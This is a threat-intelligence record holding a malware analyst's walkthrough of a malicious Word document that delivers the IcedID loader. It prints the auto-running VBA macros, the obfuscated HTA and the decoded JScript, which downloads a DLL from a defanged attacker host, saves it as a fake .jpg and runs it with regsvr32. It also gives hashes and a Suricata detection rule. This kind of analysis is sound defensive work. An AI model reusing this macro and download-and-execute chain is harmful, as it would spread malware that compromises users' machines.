{
    "id": "d8fe41e9-74d4-47fa-9a0b-dc442924fe65",
    "created_at": "2023-01-12T15:10:22.875851Z",
    "updated_at": "2025-03-27T02:09:45.584864Z",
    "deleted_at": null,
    "sha1_hash": "b8b5d665f6e2fbf79aea1a8f1074fe6b6a0182ff",
    "title": "2022-01-01 - Analyzing an IcedID Loader Document",
    "authors": "",
    "file_creation_date": "2022-05-28T05:06:46Z",
    "file_modification_date": "2022-05-28T05:06:46Z",
    "file_size": 951207,
    "plain_text": "# Analyzing an IcedID Loader Document\n\n**forensicitguy.github.io/analyzing-icedid-document/**\n\n### By Tony Lambert Posted 2022-01-01 Updated 2022-03-28 11 min read\n\n In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload.\n\n The original document can be found on MalwareBazaar here: https://bazaar.abuse.ch/sample/ecd84fa8d836d5057149b2b3a048d75004ca1a1377fcf2f5e67374af3a1161a0/\n\n## Analyzing the Document\n\n### We can start off by looking at the document properties with exiftool .\n```\n  remnux@remnux:~/cases/icedid$ exiftool maldoc.doc \n  ExifTool Version Number     : 12.30\n  File Name            : maldoc.doc\n  Directory            : .\n  File Size            : 78 KiB\n  File Modification Date/Time   : 2022:01:01 00:52:52  05:00\n  File Access Date/Time      : 2021:12:31 20:06:54  05:00\n  File Inode Change Date/Time   : 2021:12:31 19:54:10  05:00\n  File Permissions        : -rw-r--r-  File Type            : DOC\n  File Type Extension       : doc\n  MIME Type            : application/msword\n  Identification         : Word 8.0\n  Language Code          : English (US)\n  Doc Flags            : Has picture, 1Table,\n  ExtChar\n  System             : Windows\n  Word 97             : No\n  Title              : \n  Subject             : \n  Author             : \n  Keywords            : \n  Comments            : ta\n  Template            : Normal\n  Last Modified By        : Пользователь Windows\n  Software            : Microsoft Office Word\n  Create Date           : 2021:12:27 11:02:00\n  Modify Date           : 2021:12:27 11:02:00\n  Security            : None\n  Code Page            : Windows Cyrillic\n  Category            : explorer\n  Manager             : \n  Company             : ript.sh\n  Bytes              : 26624\n  Char Count With Spaces     : 16233\n  App Version           : 16.0000\n  Scale Crop           : No\n  Links Up To Date        : No\n  Shared Doc           : No\n  Hyperlinks Changed       : No\n  Title Of Parts         : \n  Heading Pairs          : Название, 1\n  Comp Obj User Type Len     : 32\n  Comp Obj User Type       : Microsoft Word 97-2003 �\n  Last Printed          : 0000:00:00 00:00:00\n  Revision Number         : 2\n  Total Edit Time         : 0\n  Words              : 116\n  Characters           : 16118\n  Pages              : 1\n  Paragraphs           : 1\n  Lines              : 65\n\n```\n\nJanuary 1, 2022\n\n\n-----\n\n### We can see a few parts of the document properties are weird, like Company containing ript.sh . From here we can usually assume some form of a macro or exploit is involved, so we can use oledump.py to investigate macros first.\n\n\n-----\n\n```\n  remnux@remnux:~/cases/icedid$ oledump.py\n  maldoc.doc \n   1:    114 '\\x01CompObj'\n   2:   4096 '\\x05DocumentSummaryInformation'\n   3:   4096 '\\x05SummaryInformation'\n   4:   7224 '1Table'\n   5:   26648 'Data'\n   6:    398 'Macros/PROJECT'\n   7:    56 'Macros/PROJECTwm'\n   8: M  2420 'Macros/VBA/ThisDocument'\n   9:   2896 'Macros/VBA/_VBA_PROJECT'\n  10:   1708 'Macros/VBA/__SRP_0'\n  11:    241 'Macros/VBA/__SRP_1'\n  12:    983 'Macros/VBA/__SRP_2'\n  13:    364 'Macros/VBA/__SRP_3'\n  14:    553 'Macros/VBA/dir'\n  15: M  1103 'Macros/VBA/main'\n  16:   19522 'WordDocument'\n\n### The output from oledump.py indicates streams 8 and 15 contain macro content, so let’s dive into those. Using oledump.py -v -s 8 and\n-s 15 we can get the contents of the macros. I’ve annotated the macros with contents below:\n  Attribute VB_Name = \"ThisDocument\"\n  Attribute VB_Base = \"1Normal.ThisDocument\"\n  Attribute VB_GlobalNameSpace = False\n  Attribute VB_Creatable = False\n  Attribute VB_PredeclaredId = True\n  Attribute VB_Exposed = True\n  Attribute VB_TemplateDerived = True\n  Attribute VB_Customizable = True\n  'contents() finds contents of the document and removes all instances of s3x\n  Function contents()\n    With ActiveDocument.Content\n      superI7Center = .Find.Execute(FindText:=\"s3x\", ReplaceWith:=\"\", Replace:=2)\n    End With\n  End Function\n  'cont1() returns the specified document property (which is visible with exiftool)\n  Function cont1(i7ComputerMonitor)\n    cont1 = ActiveDocument.BuiltInDocumentProperties(i7ComputerMonitor).Value\n    contents\n  End Function\n  'srn1() runs \"CreateObject(\"wscript.shell\").exec Explorer i7Gigabyte.hta\"\n  Public Function srn1(mouseVideo)\n    CreateObject(\"wsc\" + cont1(\"company\") + \"ell\").exec cont1(\"category\") + \" \" +\n  mouseVideo\n  End Function\n  Sub Document_Open()\n    hny\n  End Sub\n  ...\n  Attribute VB Name = \"main\"\n\n```\n\n-----\n\n```\n  'hny() saves the content of the document to i7Gigabyte.hta and executes the contents.\n  Public Sub hny()\n    processorI9 = Trim(\"i7Gigabyte.h\" & ThisDocument.cont1(\"comments\"))\n    ActiveDocument.SaveAs2 FileName:=processorI9, FileFormat:=2\n    ThisDocument.srn1 processorI9\n  End Sub\n\n### The VB macros use these document properties:\n\n```\n\n-----\n\n```\n  Comments            : ta\n  Category            :\n  explorer\n  Company             :\n  ript.sh\n\n### From the macro content, we can expect a few things:\n   i7Gigabyte.hta will get written to disk\n\n MS Word will execute explorer i7Gigabyte.hta\n   i7Gigabyte.hta will contain HTML content and likely some JavaScript\n\n To get the document content, we can use oledump.py -s 16 and run strings against its output:\n  remnux@remnux:~/cases/icedid$ oledump.py -d -s 16 maldoc.doc |\n  strings\n  bjbj\n  <s3xhs3xts3xms3xls3x>s3x<s3xbs3xos3xds3xys3x>s3x<s3xps3x\n  s3xis3xds3x\n  ...\n\n We can copy and paste the text into its own file. To see what will execute, we can use Find/Replace in VSCode to see the final version.\n\n## Analyzing the Stage 2 HTA\n\n### I’ve gone ahead and prettified the HTA’s code below:\n  <html>\n    <body>\n      <p id='processorRtx' style='font-color: #000'>eval</p>\n      <p id='rtxI7' style='font-color: #000'>\n  fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdDs\n  YXY=---OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaWYuZ25pdHBp\n      </p>  \n      <p id='notebookGigabyteGigabyte' style='font-color: #fff'>\n        ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n      </p>\n      <script language='javascript'>\n        function centerAsusSuper(i9I9Table){\n          return(new ActiveXObject(i9I9Table));\n          }\n        function cardI9Processor(i9VideoMouse){\n          return(tableNotebook.getElementById(i9VideoMouse).innerHTML);\n          }\n        function i7ProcessorCard(processorAsus){\n          return('cha' + processorAsus);\n           }\n\n```\n\n-----\n\n```\n      function tableI9I9(processorMonitorSuper){\n        var notebookProcessor = cardI9Processor('notebookGigabyteGigabyte')\n        var videoSuper = \"\";\n        var superProcessorI9, cardKeyboard, computerComputerSuper;\n        var notebookMouseComputer, gigabyteTableComputer, processorGigabyte, tableCenter;\n        var cardRtxCard = 0;\n        processorMonitorSuper = processorMonitorSuper.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\");\n        while(cardRtxCard < processorMonitorSuper.length){\n          notebookMouseComputer = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++));\n          gigabyteTableComputer = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++));\n          processorGigabyte = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++));\n          tableCenter = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++));\n          superProcessorI9 = (notebookMouseComputer << 2) | (gigabyteTableComputer >> 4);\n          cardKeyboard = ((gigabyteTableComputer & 15) << 4) | (processorGigabyte >> 2);\n          computerComputerSuper = ((processorGigabyte & 3) << 6) | tableCenter;\n          videoSuper = videoSuper + String.fromCharCode(superProcessorI9);\n          if(processorGigabyte != 64){\n            videoSuper = videoSuper + String.fromCharCode(cardKeyboard);\n          }\n          if(tableCenter != 64){\n            videoSuper = videoSuper + String.fromCharCode(computerComputerSuper);\n          }\n        }\n        return(videoSuper);\n      }\n      function i7AsusVideo(i7Processor){\n        return i7Processor.split('').reverse().join('');\n      }\n      function monitorMonitorRtx(processorAsus){\n        return(i7AsusVideo(tableI9I9(processorAsus)));\n      }\n      function asusProcessorMonitor(processorAsus, centerNotebook){\n        return(processorAsus.split(centerNotebook));\n      }\n      cardTableMonitor = window;\n      tableNotebook = document;\n      cardTableMonitor['moveTo'](-101, -102);\n      var tableRtx = cardI9Processor('rtxI7').split(\"---\");\n      var cardComputerMonitor = monitorMonitorRtx(tableRtx[0]);\n      var rtxI7Super = monitorMonitorRtx(tableRtx[1]);\n    </script>\n    <script language='javascript'>\n      function rtxVideo(processorProcessorVideo){\n        cardTableMonitor[cardI9Processor('processorRtx')](processorProcessorVideo);\n      }\n    </script>\n    <script language='vbscript'>\n      Call rtxVideo(cardComputerMonitor)\n      Call rtxVideo(rtxI7Super)\n    </script>\n    <script language='javascript'>\n      cardTableMonitor['close']();\n    </script>\n  </body>\n</html>\n\n```\n\n-----\n\n-----\n\n### We can make a few hypotheses about the code:\n```\n   << and >> and the string ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= show the possible use of\n\n a rotation cipher\n   eval is the JavaScript keyword to execute additional JavaScript code\n   .split(\"---\") and --- in the larger string above indicate the larger string will get split in two elements\n\n At the end of the document the scripting changes languages from JavaScript to VBscript but it doesn’t really make a difference in execution. The beautiful and handy thing about this stage is that it doesn’t use any Windows-specific scripting structures, which means we can easily use a NodeJS REPL to decode everything without having to manually decode the cipher. To do this, we can split the larger string manually and feed it into the monitorMonitorRtx() function.\n  > string1 =\n  'fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdD\n  YXY='\n  > monitorMonitorRtx(string1)\n  'var videoProcessorSuper = new ActiveXObject(\"msxml2.xmlhttp\");videoProcessorSuper.open(\"GET\", \"hxxp://patelboostg[.]com/frhe/L8dcl\n  > var string2 = 'OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaW\n  > monitorMonitorRtx(string2)\n  'var rtxTableGigabyte = new ActiveXObject(\"wscript.shell\");var i7MouseTable = new ActiveXObject(\"scripting.filesystemobject\");rtxTa\n\n Piecing those components together we get this script that executes via an eval statement:\n\n```\n\n-----\n\n```\n  var videoProcessorSuper = new ActiveXObject(\"msxml2.xmlhttp\");\n  videoProcessorSuper.open(\"GET\",\n  \"hxxp://patelboostg[.]com/frhe/L8dclCye7SQ5WTFva78FDxOjGBOF9iJro4DRgV/5inYIaSBt0KLfMB9kXwZBv6ZpTsny6/qAhIQjrAaLKJeTLQnbCarASpMADNe9\n  aci3?page=V8BBaQuem65&page=XYvyd0Dcrg6fJYLGHRVWp7s1tv&page=dvZwXcjcYCjBX8tPaALshiDAx85PEq&sid=10tOgWzOZj9xyAidNJAz3d9Ob0\", false);\n  videoProcessorSuper.send();\n  if(videoProcessorSuper.status == 200){\n    try{\n      var tableVideoRtx = new ActiveXObject(\"adodb.stream\");\n      tableVideoRtx.open;\n      tableVideoRtx.type = 1;\n      tableVideoRtx.write(videoProcessorSuper.responsebody);\n      tableVideoRtx.savetofile(\"c:\\\\\\\\users\\\\\\\\public\\\\\\\\gigabyteI7.jpg\", 2);\n      tableVideoRtx.close;\n    } catch(e){\n    }\n  }\n  var rtxTableGigabyte = new ActiveXObject(\"wscript.shell\");var i7MouseTable = new ActiveXObject(\"scripting.filesystemobject\");rtxTab\n\n### Some more hypotheses:\n\n Something (presumably a DLL) gets downloaded from patelboostg[.]com The something gets written to c:\\users\\public\\gigabyteI7.jpg The HTA document (executed by mshta.exe ) will execute regsvr32 c:\\users\\public\\gigabyteI7.jpg\n\n## Analyzing the Downloaded DLL\n\n### The downloaded DLL has these properties:\n  filepath:  gigabyteI7.jpg\n  md5:    815d99185422a8a1f891f902824da431\n  sha1:    0b33b6b89e805e180e6e1bb272bb66de6c9f99d0\n  sha256:   317383e111b7d1c2e9b6743f7b71263bff669d2e47c3e1a7853e1e616d6b1317\n  ssdeep:  \n  3072:aiKU8Wb6WxbqCM8aSEFrsEdRBHS3XVJS3YMJ/Pu0DMLLcLGiDZxr:AUnlMMCrr9SnV0VLGi9d\n  imphash:  00a5fbfb9a1df393796976ca031dea1e\n  rich:    cb10e59fdfb53fda4e672326b51f6e56\n\n The import table hash (imphash) and rich header hash (rich) can help you find similar samples in VirusTotal or other services. When combining searches using both of those hash values you can discover samples with similar capabilities made in similar build environments when compared with this DLL sample.\n\n Looking at the DLL with pedump, we find some more data. First, the DLL exports:\n\n```\n\n-----\n\n```\n  === EXPORTS ===\n  # module \"stub.dll\"\n  # flags=0x0 ts=\"2106-02-07 06:28:15\" version=0.0 \n  ord_base=1\n  # nFuncs=3 nNames=3\n   ORD ENTRY_VA NAME\n    1   a84c DllGetClassObject\n    2   a814 DllRegisterServer\n    3   ab5c PluginInit\n\n### The export DllRegisterServer jives with what we can expect of the malware, it’s the DLL export used by regsvr32.exe . If we decide to continue analysis with Ghidra or another tool that’s an excellent entry point to start analysis. The export PluginInit is also interesting. I usually expect exports like DllRegisterServer, DllUnregisterServer, DllMain, ServiceMain, or others, and PluginInit isn’t one I commonly encounter. This would also be another excellent lead in Ghidra.\n\n Using manalyze we can also see some suspicious imports:\n  [ SUSPICIOUS ] The PE contains functions most legitimate programs don't\n  use.\n    [!] The program may be hiding some of its imports:\n      GetProcAddress\n      LoadLibraryExW\n    Functions which can be used for anti-debugging purposes:\n      SwitchToThread\n    Memory manipulation functions often used by packers:\n      VirtualProtect\n      VirtualAlloc\n\n VirtualAlloc, VirtualProtect, and SwitchToThread might be fun breakpoints if we decide to get rowdy with a debugger.\n\n## Confirming Hypotheses with a Sandbox\n\n### We can dive deeper into static analysis using Ghidra and x64debug, but I wan to eventually go to bed tonight. So I’m going to consult sandbox reports from ANY.RUN and Tria.ge.\n\n https://app.any.run/tasks/0747e33b-70c5-4154-ae55-5111424b02ac/ https://tria.ge/211231-m85kasfchr\n\n Looking at those reports, we can confirm our hypotheses about process ancestry.\n\n```\n\n-----\n\n### The Tria.ge report suggests another data point, that this threat is classified as IcedID. Again, this jives with previous data from MalwareBazaar suggesting the original document was related to IcedID.\n\n\n-----\n\n## How Do We Know It’s IcedID???\n\n### One of the things that greatly bothers me about many intelligence reports/blog posts/etc. is that they often don’t spell out how they know the malware is related to a named threat. So I’m going to go the extra step to do that here.\n\n First, the export PluginInit has been documented with IcedID before:\n\n https://www.splunk.com/en_us/blog/security/detecting-icedid-could-it-be-a-trickbot-copycat.html https://blogs.vmware.com/security/2021/07/icedid-analysis-and-detection.html https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/\n\n Next, we can dig into the Tria.ge report. The reports suggests it found evidence of IcedID based on this Suricata alert:\n```\n  alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE Win32/IcedID Request Cookie\"; flow:established,to_server;\n  http.method; content:\"GET\"; http.cookie; content:\"_gads=\"; depth:7; content:\"_gat=\"; distance:0; content:\"_ga=\"; distance:0;\n  content:\"_u=\"; distance:0; content:\"_io=\"; distance:0; content:\"_gid=\"; distance:0;\n  reference:url,sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html;\n  reference:url,www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html;\n  classtype:trojan-activity; sid:2032086; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit,\n  attack_target Client_Endpoint, created_at 2021_03_17, deployment Perimeter, former_category MALWARE, signature_severity Major,\n  updated_at 2021_03_17;)\n\n Essentially, the rule hits on HTTP GET requests with cookies containing _gads=, _gat=, _ga=, _u=, _io=, and _gid= values. These fields are explained within the blog post mentioned in the rule https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated- photoloader.html.\n\n If Suricata found criteria that hit that rule, we can confirm the alert using a PCAP from the sandbox report. We can toss this into Wireshark and follow the TCP stream that aligns with unencrypted HTTP traffic on port 80.\n\n```\n\n-----\n\n### Within that stream we can see the cookie values Suricata found:\n```\n  Cookie: __gads=2507181075:1:259392:73; _gat=10.0.15063.64;\n  _ga=1.198354.1970169159.96;\n  _u=4D484B4B48555949:41646D696E:34384630373343324432444138443743; \n  __io=21_369956170_74428499_1628131376; _gid=B3BF3B3C3D65\n\n If the threat really is IcedID, we should be able to decode these cookie values using the method described in the Sysopfb blog post above. According to the post, the _u value can be decoded using unhexlify in Python. We can give that a shot here to see if it decodes properly:\n  >>> import binascii\n  >>>\n  binascii.unhexlify('4D484B4B48555949'\n  )\n  b'MHKKHUYI'\n  >>> binascii.unhexlify('41646D696E')\n  b'Admin'\n\n The first value decodes to what was presumably the sandbox VM’s hostname and the second value decodes to the affected username.\n\n The _gat value contains 10.0.15063.64 . The Sysopfb blog post indicates that in IcedID this corresponds to the victim’s Windows version. This version we see in the cookie does correspond to a known Windows build, so that data overlaps.\n\n These cookie overlaps alongside PluginInit give me enough data points to assert with medium to high confidence we’re looking at IcedID.\n\n Thanks for joining in, and Happy New Year!!!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-01 - Analyzing an IcedID Loader Document.pdf"
    ],
    "report_names": [
        "2022-01-01 - Analyzing an IcedID Loader Document.pdf"
    ],
    "threat_actors": [
        {
            "id": "c3c864b3-fac9-4d56-8500-7c06c829fbf8",
            "created_at": "2023-01-06T13:46:39.071873Z",
            "updated_at": "2025-03-27T02:00:02.990045Z",
            "deleted_at": null,
            "main_name": "TA2101",
            "aliases": [
                "Storm-0216",
                "DEV-0216",
                "UNC2198",
                "Maze Team",
                "TWISTED SPIDER",
                "GOLD VILLAGE"
            ],
            "source_name": "MISPGALAXY:TA2101",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536222,
    "ts_updated_at": 1743041385,
    "ts_creation_date": 1653714406,
    "ts_modification_date": 1653714406,
    "files": {
        "pdf": "https://archive.orkl.eu/b8b5d665f6e2fbf79aea1a8f1074fe6b6a0182ff.pdf",
        "text": "https://archive.orkl.eu/b8b5d665f6e2fbf79aea1a8f1074fe6b6a0182ff.txt",
        "img": "https://archive.orkl.eu/b8b5d665f6e2fbf79aea1a8f1074fe6b6a0182ff.jpg"
    }
}